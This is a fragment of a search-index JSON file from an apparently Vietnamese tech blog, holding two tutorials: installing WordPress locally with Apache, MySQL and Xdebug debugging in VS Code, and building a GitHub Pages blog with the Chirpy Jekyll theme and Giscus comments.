mysql\u003e FLUSH PRIVILEGES; Query OK, 1 row affected (0,00 sec) -- Thoát mysql\u003e quit Bye Khởi động lại dịch vụ: sudo service mysql start Configure WordP","date":"2025-08-21","objectID":"/vi/posts/2025-08-21-wordpress-local-and-debugging/:3:1","tags":["cms","php","wordpress"],"title":"WordPress Local and Debugging","uri":"/vi/posts/2025-08-21-wordpress-local-and-debugging/#configure-wordpress-to-connect-to-the-database"},{"categories":["Web"],"collections":null,"content":"Install and configure WordPress\rInstall Dependencies\rCài toàn bộ stack cần thiết để chạy WordPress (web server + database + PHP + các extension quan trọng). sudo apt install apache2 \\ ghostscript \\ libapache2-mod-php \\ mysql-server \\ php \\ php-bcmath \\ php-curl \\ php-imagick \\ php-intl \\ php-json \\ php-mbstring \\ php-mysql \\ php-xml \\ php-zip Install WordPress\rTải và cài mã nguồn WordPress vào thư mục web. # Tạo folder để lưu trữ mã nguồn website sudo mkdir -p /srv/www # Đổi owner thành www-data, đây là user mặc định của Apache/Nginx để chạy web server # Khi Apache/NGINX khởi động, nó không chạy bằng root (nguy hiểm vì có toàn quyền hệ thống), mà sẽ drop xuống chạy dưới quyền www-data. sudo chown www-data: /srv/www # Tải gói WordPress mới nhất từ trang chính thức # Giải nén vao thưc mục /srv/www được tạo ở trên curl https://wordpress.org/latest.tar.gz | sudo -u www-data tar zx -C /srv/www Có thể tải phiên bản cụ thể bằng: curl https://wordpress.org/wordpress-6.6.2.tar.gz | sudo -u www-data tar zx -C /srv/www Cài từ wordpress.org là cách chuẩn nhất và ít rủi ro: Ubuntu có sẵn package wordpress trong repo. Nhưng nó thường cũ hơn nhiều so với bản chính thức trên wordpress.org Cộng đồng WordPress chỉ hỗ trợ khi bạn dùng bản chính thức từ wordpress.org, vì nếu bạn gặp lỗi do package của Ubuntu thì họ không giải quyết được. {: .prompt-info } Configure Apache for WordPress\rTạo file /etc/apache2/sites-available/wordpress.conf cấu hình Apache cho WordPress: # Lắng nghe trên tất cả địa chỉ IP (*) tại port 80 (HTTP). # Thư mục gốc của website (nơi chứa mã nguồn WordPress). DocumentRoot /srv/www/wordpress Options FollowSymLinks # Cho phép file .htaccess ghi đè một số thiết lập liên quan đến bảo mật và URL rewriting. AllowOverride Limit Options FileInfo # Khi truy cập thư mục, Apache sẽ tìm file index.php để hiển thị. DirectoryIndex index.php # Cho phép tất cả mọi người truy cập (cần cho website public). Require all granted # Riêng thư mục wp-content (chứa plugin, theme, upload) cũng cho phép truy cập. Options FollowSymLinks Require all granted Kích hoạt site WordPress: sudo a2ensite wordpress a2ensite = enable site config (tạo symlink từ /etc/apache2/sites-available/wordpress.conf sang /etc/apache2/sites-enabled/) Sau đó site wordpress sẽ được Apache load khi restart. Kích hoạt module rewrite: sudo a2enmod rewrite WordPress cần module mod_rewrite để hỗ trợ Pretty Permalinks (ví dụ /blog/hello-world/ thay vì ?p=123) Vô hiệu hóa site mặc định (Option): sudo a2dissite 000-default Apache mặc định có site 000-default.conf (chỉ hiển thị “It works!”) Nếu không disable, site mặc định có thể chiếm port 80 trước WordPress 👉 Hoặc nếu không muốn disable, có thể thêm ServerName vào VirtualHost WordPress để Apache phân biệt domain. ServerName mywordpress.local DocumentRoot /srv/www/wordpress ... Muốn chạy được thì phải cấu hình DNS hoặc sửa file hosts: Linux/Mac: /etc/hosts Windows: C:\\Windows\\System32\\drivers\\etc\\hosts Reload Apache: sudo service apache2 reload Tải lại cấu hình mới mà không cần dừng server Configure database\rWordPress cần một cơ sở dữ liệu (MySQL/MariaDB) để lưu: Bài viết, trang, menu Người dùng, mật khẩu (hash) Cấu hình site Plugins, themes settings Mở MySQL với quyền root: sudo mysql -u root Cấu hình MySQL: -- Tạo database wordpress mysql\u003e CREATE DATABASE wordpress; Query OK, 1 row affected (0,00 sec) -- Tạo user riêng cho wordpress mysql\u003e CREATE USER wordpress@localhost IDENTIFIED BY ''; Query OK, 1 row affected (0,00 sec) -- Cấp quyền cho user WordPress mysql\u003e GRANT SELECT,INSERT,UPDATE,DELETE,CREATE,DROP,ALTER ON wordpress.* TO wordpress@localhost; Query OK, 1 row affected (0,00 sec) -- Làm mới lại quyền mysql\u003e FLUSH PRIVILEGES; Query OK, 1 row affected (0,00 sec) -- Thoát mysql\u003e quit Bye Khởi động lại dịch vụ: sudo service mysql start Configure WordP","date":"2025-08-21","objectID":"/vi/posts/2025-08-21-wordpress-local-and-debugging/:3:1","tags":["cms","php","wordpress"],"title":"WordPress Local and Debugging","uri":"/vi/posts/2025-08-21-wordpress-local-and-debugging/#configure-wordpress"},{"categories":["Web"],"collections":null,"content":"Setup Debug on VSCode\rĐể hiểu được luồng của trang web chạy và xử lí ở mỗi request, ta cần phải debug nó. Add PHP Debug extension on VS Code\rVào Extensions (Ctrl+Shift+X) =\u003e tìm PHP Debug (by Felix Becker) =\u003e Install. Extension này kết nối với Xdebug. Install Xdebug on Ubuntu\rsudo apt install php-xdebug -y Kiểm tra cài chưa: php -v Nếu có dòng with Xdebug v3.x.x nghĩa là đã OK. Configure Xdebug\rsudo nano /etc/php/\u003cversion\u003e/apache2/php.ini Thêm vào cuối file zend_extension=xdebug.so xdebug.mode=debug xdebug.start_with_request=yes xdebug.client_host=127.0.0.1 xdebug.client_port=9003 Port mặc định mới của Xdebug v3 là 9003. Sau đó restart Apache: sudo systemctl restart apache2 Configure VSCode launch.json\rMở thư mục chứa trang web wordpress bằng VSCode code /srv/www/wordpress Trong VS Code =\u003e Run and Debug (Ctrl+Shift+D) =\u003e tạo file launch.json với nội dung: pathMappings: ánh xạ thư mục trong container/server (/srv/www/wordpress) về thư mục local của trong VS Code. Như vậy là đã hoàn thành setup WordPress trên local kết hợp Debug nó trên VSCode. ","date":"2025-08-21","objectID":"/vi/posts/2025-08-21-wordpress-local-and-debugging/:3:2","tags":["cms","php","wordpress"],"title":"WordPress Local and Debugging","uri":"/vi/posts/2025-08-21-wordpress-local-and-debugging/#setup-debug-on-vscode"},{"categories":["Web"],"collections":null,"content":"Setup Debug on VSCode\rĐể hiểu được luồng của trang web chạy và xử lí ở mỗi request, ta cần phải debug nó. Add PHP Debug extension on VS Code\rVào Extensions (Ctrl+Shift+X) =\u003e tìm PHP Debug (by Felix Becker) =\u003e Install. Extension này kết nối với Xdebug. Install Xdebug on Ubuntu\rsudo apt install php-xdebug -y Kiểm tra cài chưa: php -v Nếu có dòng with Xdebug v3.x.x nghĩa là đã OK. Configure Xdebug\rsudo nano /etc/php//apache2/php.ini Thêm vào cuối file zend_extension=xdebug.so xdebug.mode=debug xdebug.start_with_request=yes xdebug.client_host=127.0.0.1 xdebug.client_port=9003 Port mặc định mới của Xdebug v3 là 9003. Sau đó restart Apache: sudo systemctl restart apache2 Configure VSCode launch.json\rMở thư mục chứa trang web wordpress bằng VSCode code /srv/www/wordpress Trong VS Code =\u003e Run and Debug (Ctrl+Shift+D) =\u003e tạo file launch.json với nội dung: pathMappings: ánh xạ thư mục trong container/server (/srv/www/wordpress) về thư mục local của trong VS Code. Như vậy là đã hoàn thành setup WordPress trên local kết hợp Debug nó trên VSCode. ","date":"2025-08-21","objectID":"/vi/posts/2025-08-21-wordpress-local-and-debugging/:3:2","tags":["cms","php","wordpress"],"title":"WordPress Local and Debugging","uri":"/vi/posts/2025-08-21-wordpress-local-and-debugging/#add-php-debug-extension-on-vs-code"},{"categories":["Web"],"collections":null,"content":"Setup Debug on VSCode\rĐể hiểu được luồng của trang web chạy và xử lí ở mỗi request, ta cần phải debug nó. Add PHP Debug extension on VS Code\rVào Extensions (Ctrl+Shift+X) =\u003e tìm PHP Debug (by Felix Becker) =\u003e Install. Extension này kết nối với Xdebug. Install Xdebug on Ubuntu\rsudo apt install php-xdebug -y Kiểm tra cài chưa: php -v Nếu có dòng with Xdebug v3.x.x nghĩa là đã OK. Configure Xdebug\rsudo nano /etc/php//apache2/php.ini Thêm vào cuối file zend_extension=xdebug.so xdebug.mode=debug xdebug.start_with_request=yes xdebug.client_host=127.0.0.1 xdebug.client_port=9003 Port mặc định mới của Xdebug v3 là 9003. Sau đó restart Apache: sudo systemctl restart apache2 Configure VSCode launch.json\rMở thư mục chứa trang web wordpress bằng VSCode code /srv/www/wordpress Trong VS Code =\u003e Run and Debug (Ctrl+Shift+D) =\u003e tạo file launch.json với nội dung: pathMappings: ánh xạ thư mục trong container/server (/srv/www/wordpress) về thư mục local của trong VS Code. Như vậy là đã hoàn thành setup WordPress trên local kết hợp Debug nó trên VSCode. ","date":"2025-08-21","objectID":"/vi/posts/2025-08-21-wordpress-local-and-debugging/:3:2","tags":["cms","php","wordpress"],"title":"WordPress Local and Debugging","uri":"/vi/posts/2025-08-21-wordpress-local-and-debugging/#install-xdebug-on-ubuntu"},{"categories":["Web"],"collections":null,"content":"Setup Debug on VSCode\rĐể hiểu được luồng của trang web chạy và xử lí ở mỗi request, ta cần phải debug nó. Add PHP Debug extension on VS Code\rVào Extensions (Ctrl+Shift+X) =\u003e tìm PHP Debug (by Felix Becker) =\u003e Install. Extension này kết nối với Xdebug. Install Xdebug on Ubuntu\rsudo apt install php-xdebug -y Kiểm tra cài chưa: php -v Nếu có dòng with Xdebug v3.x.x nghĩa là đã OK. Configure Xdebug\rsudo nano /etc/php//apache2/php.ini Thêm vào cuối file zend_extension=xdebug.so xdebug.mode=debug xdebug.start_with_request=yes xdebug.client_host=127.0.0.1 xdebug.client_port=9003 Port mặc định mới của Xdebug v3 là 9003. Sau đó restart Apache: sudo systemctl restart apache2 Configure VSCode launch.json\rMở thư mục chứa trang web wordpress bằng VSCode code /srv/www/wordpress Trong VS Code =\u003e Run and Debug (Ctrl+Shift+D) =\u003e tạo file launch.json với nội dung: pathMappings: ánh xạ thư mục trong container/server (/srv/www/wordpress) về thư mục local của trong VS Code. Như vậy là đã hoàn thành setup WordPress trên local kết hợp Debug nó trên VSCode. ","date":"2025-08-21","objectID":"/vi/posts/2025-08-21-wordpress-local-and-debugging/:3:2","tags":["cms","php","wordpress"],"title":"WordPress Local and Debugging","uri":"/vi/posts/2025-08-21-wordpress-local-and-debugging/#configure-xdebug"},{"categories":["Web"],"collections":null,"content":"Setup Debug on VSCode\rĐể hiểu được luồng của trang web chạy và xử lí ở mỗi request, ta cần phải debug nó. Add PHP Debug extension on VS Code\rVào Extensions (Ctrl+Shift+X) =\u003e tìm PHP Debug (by Felix Becker) =\u003e Install. Extension này kết nối với Xdebug. Install Xdebug on Ubuntu\rsudo apt install php-xdebug -y Kiểm tra cài chưa: php -v Nếu có dòng with Xdebug v3.x.x nghĩa là đã OK. Configure Xdebug\rsudo nano /etc/php//apache2/php.ini Thêm vào cuối file zend_extension=xdebug.so xdebug.mode=debug xdebug.start_with_request=yes xdebug.client_host=127.0.0.1 xdebug.client_port=9003 Port mặc định mới của Xdebug v3 là 9003. Sau đó restart Apache: sudo systemctl restart apache2 Configure VSCode launch.json\rMở thư mục chứa trang web wordpress bằng VSCode code /srv/www/wordpress Trong VS Code =\u003e Run and Debug (Ctrl+Shift+D) =\u003e tạo file launch.json với nội dung: pathMappings: ánh xạ thư mục trong container/server (/srv/www/wordpress) về thư mục local của trong VS Code. Như vậy là đã hoàn thành setup WordPress trên local kết hợp Debug nó trên VSCode. ","date":"2025-08-21","objectID":"/vi/posts/2025-08-21-wordpress-local-and-debugging/:3:2","tags":["cms","php","wordpress"],"title":"WordPress Local and Debugging","uri":"/vi/posts/2025-08-21-wordpress-local-and-debugging/#configure-vscode-launchjson"},{"categories":["Web"],"collections":null,"content":"Extend\r","date":"2025-08-21","objectID":"/vi/posts/2025-08-21-wordpress-local-and-debugging/:4:0","tags":["cms","php","wordpress"],"title":"WordPress Local and Debugging","uri":"/vi/posts/2025-08-21-wordpress-local-and-debugging/#extend"},{"categories":["Web"],"collections":null,"content":"Required Version\rMỗi phiên bản WordPress thường đi kèm 1 phiên bản PHP thích hợp. Nên kiểm tra tính tương thích này để quá trình setup không bị lỗi. ","date":"2025-08-21","objectID":"/vi/posts/2025-08-21-wordpress-local-and-debugging/:4:1","tags":["cms","php","wordpress"],"title":"WordPress Local and Debugging","uri":"/vi/posts/2025-08-21-wordpress-local-and-debugging/#required-version"},{"categories":["Web"],"collections":null,"content":"WordPress Auto Update\rTừ WordPress 3.7 trở đi (2013), WordPress có cơ chế tự động cập nhật (automatic background updates) cho: Bản vá bảo mật (security release). Bản bảo trì (maintenance release). Không tự động update major version (trừ khi bật rõ ràng). Hệ thống kiểm tra với server api.wordpress.org để xem có bản vá nào mới sẽ tự động nâng cấp background lên. Việc này diễn ra rất nhanh sau khi setup, nên bạn thấy code đổi khác so với source gốc. Quá trình setup diễn ra khi truy cập /wp-admin/install.php Để vô hiệu hóa cơ chế cập nhật tự động này, thêm dòng sau vào wp-config.php: define( 'WP_AUTO_UPDATE_CORE', false ); ","date":"2025-08-21","objectID":"/vi/posts/2025-08-21-wordpress-local-and-debugging/:4:2","tags":["cms","php","wordpress"],"title":"WordPress Local and Debugging","uri":"/vi/posts/2025-08-21-wordpress-local-and-debugging/#wordpress-auto-update"},{"categories":["Web"],"collections":null,"content":"How to create your personal blog using Github Pages with \"comment\" feature","date":"2025-08-19","objectID":"/vi/posts/2025-08-19-github-pages-with-jekyll-themes-and-giscus/","tags":["blog","jekyll","giscus","github"],"title":"Github Pages with Jekyll themes and Giscus","uri":"/vi/posts/2025-08-19-github-pages-with-jekyll-themes-and-giscus/"},{"categories":["Web"],"collections":null,"content":"Khi bắt đầu tạo blog cá nhân, có ba công cụ bạn cần biết: GitHub Pages, Jekyll và Giscus. Github Pages: Dịch vụ miễn phí từ GitHub, cho phép bạn triển khai website tĩnh trực tiếp từ repository. Chỉ cần push code lên GitHub, blog của bạn sẽ tự động xuất hiện trên Internet mà không cần server riêng. Jekyll: Một static site generator tích hợp sẵn với GitHub Pages. Jekyll giúp bạn dễ dàng tạo blog từ các file Markdown, tổ chức nội dung bằng template và theme sẵn có. Giscus: Một hệ thống bình luận hiện đại dựa trên GitHub Discussions. Thay vì phải dùng dịch vụ ngoài như Disqus, bạn có thể tận dụng GitHub để quản lý comment, vừa gọn nhẹ vừa thân thiện với developer. ","date":"2025-08-19","objectID":"/vi/posts/2025-08-19-github-pages-with-jekyll-themes-and-giscus/:0:0","tags":["blog","jekyll","giscus","github"],"title":"Github Pages with Jekyll themes and Giscus","uri":"/vi/posts/2025-08-19-github-pages-with-jekyll-themes-and-giscus/#"},{"categories":["Web"],"collections":null,"content":"Requirements\rTài khoản Github Kiến thức cơ bản về Markdown ","date":"2025-08-19","objectID":"/vi/posts/2025-08-19-github-pages-with-jekyll-themes-and-giscus/:1:0","tags":["blog","jekyll","giscus","github"],"title":"Github Pages with Jekyll themes and Giscus","uri":"/vi/posts/2025-08-19-github-pages-with-jekyll-themes-and-giscus/#requirements"},{"categories":["Web"],"collections":null,"content":"Creating a Site Repository\rỞ đây, tôi sử dụng Chirpy themes, đây là theme khá nổi tiếng dành cho GitHub Pages, được tối ưu cho việc viết blog cá nhân hoặc technical blog. Các bước thực hiện: Đăng nhập vào Github và di chuyển đến starter Thay vì Fork, ta click Use this template và chọn Create a new repository để tự động tạo Site Repository. Đặt tên cho Repository mới \u003cusername\u003e.github.io, thay đổi \u003cusername\u003e thành Github username của bạn. ","date":"2025-08-19","objectID":"/vi/posts/2025-08-19-github-pages-with-jekyll-themes-and-giscus/:2:0","tags":["blog","jekyll","giscus","github"],"title":"Github Pages with Jekyll themes and Giscus","uri":"/vi/posts/2025-08-19-github-pages-with-jekyll-themes-and-giscus/#creating-a-site-repository"},{"categories":["Web"],"collections":null,"content":"Setting up the Environment\rCó 2 lý do chính bạn nên setup môi trường trên máy local khi phát triển blog: Sau khi push code lên Repository, GitHub Actions sẽ mất một khoảng thời gian để chạy rồi mới build và render ra GitHub Pages. Khi dev trực tiếp trên local, bạn có thể quan sát kết quả ngay lập tức, nhanh hơn và thuận tiện hơn. ","date":"2025-08-19","objectID":"/vi/posts/2025-08-19-github-pages-with-jekyll-themes-and-giscus/:3:0","tags":["blog","jekyll","giscus","github"],"title":"Github Pages with Jekyll themes and Giscus","uri":"/vi/posts/2025-08-19-github-pages-with-jekyll-themes-and-giscus/#setting-up-the-environment"},{"categories":["Web"],"collections":null,"content":"Using Dev Containers (Recommended for Windows)\rDev Containers cung cấp một môi trường cô lập bằng Docker, giúp tránh xung đột với hệ thống và đảm bảo mọi dependency đều được quản lý trong container. Các bước thực hiện: Cài đặt Docker: Trên Windows/macOS: cài Docker Desktop. Trên Linux: cài Docker Engine. Cài VS Code và extension Dev Containers. Clone repository: Nếu dùng Docker Desktop: mở VS Code và clone repo trong container volume. Nếu dùng Docker Engine: clone repo về local, sau đó mở bằng container trong VS Code. Chờ quá trình thiết lập Dev Containers hoàn tất. ","date":"2025-08-19","objectID":"/vi/posts/2025-08-19-github-pages-with-jekyll-themes-and-giscus/:3:1","tags":["blog","jekyll","giscus","github"],"title":"Github Pages with Jekyll themes and Giscus","uri":"/vi/posts/2025-08-19-github-pages-with-jekyll-themes-and-giscus/#using-dev-containers-recommended-for-windows"},{"categories":["Web"],"collections":null,"content":"Setting up Natively (Recommended for Unix-like OS)\rVới các hệ điều hành dạng Unix-like (Linux, macOS), bạn có thể setup môi trường trực tiếp (native) để đạt hiệu năng tốt nhất. Ngoài ra, vẫn có thể dùng Dev Containers như một lựa chọn thay thế. Các bước thực hiện: Làm theo hướng dẫn cài đặt Jekyll và đảm bảo đã cài đặt Git. Clone repository về máy local. Nếu bạn fork theme, cài Node.js và chạy bash tools/init.sh trong thư mục gốc để khởi tạo repo. Chạy lệnh dưới đây ở thư mục gốc để toàn bộ gem sẽ được cài vào ./vendor/bundle/ trong project, không cần sudo và không đụng gì đến /var/lib/gems.. bundle config set --local path 'vendor/bundle' bundle install ","date":"2025-08-19","objectID":"/vi/posts/2025-08-19-github-pages-with-jekyll-themes-and-giscus/:3:2","tags":["blog","jekyll","giscus","github"],"title":"Github Pages with Jekyll themes and Giscus","uri":"/vi/posts/2025-08-19-github-pages-with-jekyll-themes-and-giscus/#setting-up-natively-recommended-for-unix-like-os"},{"categories":["Web"],"collections":null,"content":"Usage\r","date":"2025-08-19","objectID":"/vi/posts/2025-08-19-github-pages-with-jekyll-themes-and-giscus/:4:0","tags":["blog","jekyll","giscus","github"],"title":"Github Pages with Jekyll themes and Giscus","uri":"/vi/posts/2025-08-19-github-pages-with-jekyll-themes-and-giscus/#usage"},{"categories":["Web"],"collections":null,"content":"Start the Jekyll Server\rĐể chạy site trên local, sử dụng lệnh dưới đây: bundle exec jekyll s ","date":"2025-08-19","objectID":"/vi/posts/2025-08-19-github-pages-with-jekyll-themes-and-giscus/:4:1","tags":["blog","jekyll","giscus","github"],"title":"Github Pages with Jekyll themes and Giscus","uri":"/vi/posts/2025-08-19-github-pages-with-jekyll-themes-and-giscus/#start-the-jekyll-server"},{"categories":["Web"],"collections":null,"content":"Configuration\rMột số biến cần cấu hình trong _config.yml, bao gồm: lang: Set language cho website của bạn url: Trỏ đến website của bạn title: Title chính, nằm dưới avatar tagline: Subtitle, mô tả trang web avatar: hỗ trợ local và CORS resources, có thể sử dụng gif ","date":"2025-08-19","objectID":"/vi/posts/2025-08-19-github-pages-with-jekyll-themes-and-giscus/:4:2","tags":["blog","jekyll","giscus","github"],"title":"Github Pages with Jekyll themes and Giscus","uri":"/vi/posts/2025-08-19-github-pages-with-jekyll-themes-and-giscus/#configuration"},{"categories":["Web"],"collections":null,"content":"Comment feature via Giscus\rTa sử dụng Giscus làm hệ thống comment cho website, ngoài ra còn các option khác như: Disqus, Utterances, tất cả đều miễn phí. Các bước thực hiện: Cài đặt giscus vào Github. Vào Settings của repository chọn General và bật Discussions để giscus lưu comments vào Discussions. Nhập repository \u003cusername\u003e/\u003cusername\u003e.github.io, thông báo màu xanh lá xuất hiện khi các tiêu chí ở trên được đáp ứng. Chọn thể loại discussion và chủ đề cho website. Cấu hình giscus trong _config.yml provider: chọn giscus giscus: mapping các biến tương ứng đã làm ở giscus vào biến giscus. ","date":"2025-08-19","objectID":"/vi/posts/2025-08-19-github-pages-with-jekyll-themes-and-giscus/:4:3","tags":["blog","jekyll","giscus","github"],"title":"Github Pages with Jekyll themes and Giscus","uri":"/vi/posts/2025-08-19-github-pages-with-jekyll-themes-and-giscus/#comment-feature-via-giscus"},{"categories":["Web"],"collections":null,"content":"Customize the Favicon\rTạo favicon riêng cho website của bạn, không phải sử dụng favicon mặc định của themes Các bước thực hiện: Truy cập Favicon Genarate Click Browse chọn favicon cần tạo, sau đó click Create Favicon để tạo. Click Download the generated favicon để tải các file chứa các favicon về. Giải nén file vừa tải, xóa 2 file dưới đây: browserconfig.xml site.webmanifest Copy toàn bộ file còn lại và paste vào assets/img/favicons(nếu chưa có thì tạo). ","date":"2025-08-19","objectID":"/vi/posts/2025-08-19-github-pages-with-jekyll-themes-and-giscus/:4:4","tags":["blog","jekyll","giscus","github"],"title":"Github Pages with Jekyll themes and Giscus","uri":"/vi/posts/2025-08-19-github-pages-with-jekyll-themes-and-giscus/#customize-the-favicon"},{"categories":["Web"],"collections":null,"content":"Extends\r","date":"2025-08-19","objectID":"/vi/posts/2025-08-19-github-pages-with-jekyll-themes-and-giscus/:5:0","tags":["blog","jekyll","giscus","github"],"title":"Github Pages with Jekyll themes and Giscus","uri":"/vi/posts/2025-08-19-github-pages-with-jekyll-themes-and-giscus/#extends"},{"categories":["Web"],"collections":null,"content":"Remove meta tag in Footer\rCó thể xóa dòng Using the Chirpy theme for Jekyll. bằng các bước sau: Tạo file theo đường dẫn sau _data/locales/en.yml. Copy nội dung en.yml và dán vào file vừa tạo. Sửa nội dung biến meta thành \"\" ","date":"2025-08-19","objectID":"/vi/posts/2025-08-19-github-pages-with-jekyll-themes-and-giscus/:5:1","tags":["blog","jekyll","giscus","github"],"title":"Github Pages with Jekyll themes and Giscus","uri":"/vi/posts/2025-08-19-github-pages-with-jekyll-themes-and-giscus/#remove-meta-tag-in-footer"},{"categories":["Web"],"collections":null,"content":"Write a post\rTham khảo rule để viết blog của themes và sử dụng Live Preview để quan sát ","date":"2025-08-19","objectID":"/vi/posts/2025-08-19-github-pages-with-jekyll-themes-and-giscus/:5:2","tags":["blog","jekyll","giscus","github"],"title":"Github Pages with Jekyll themes and Giscus","uri":"/vi/posts/2025-08-19-github-pages-with-jekyll-themes-and-giscus/#write-a-post"}]